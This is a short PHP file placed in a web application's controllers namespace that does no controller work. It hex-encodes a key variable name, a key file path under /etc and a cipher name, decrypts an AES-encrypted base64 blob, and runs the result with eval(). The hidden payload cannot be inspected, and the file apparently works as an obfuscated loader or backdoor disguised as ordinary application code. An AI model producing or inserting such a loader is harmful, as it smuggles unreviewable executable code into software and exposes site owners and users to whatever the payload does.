<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('r6B6eA9qzgN+x0QWKYqRRw==');

$c=base64_decode(

'1n508/IcioSa+hNcObbAmqe3pl3+1JJXg106f+vaJJWkE/NgxGKApT0/5Ia7RXy6GnqySV7s4o2o' .
'3UKQVKaaZGHGU4fkP/Jki8FMRDPuTgPUeNBPbfGZrQA2rBdjrqYJRl/cCREU8BGv5LgDGVXDFtRW' .
'FERp/RThN/dGkuzNk5dd1psGkDjw6sy4yW2zxuEofWmLiWl9IfdVCYjs1W+c79LzJF3+4k6g3VmY' .
'LjEPhQeIKQa3Nfmznoh9we8Yo8mG'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

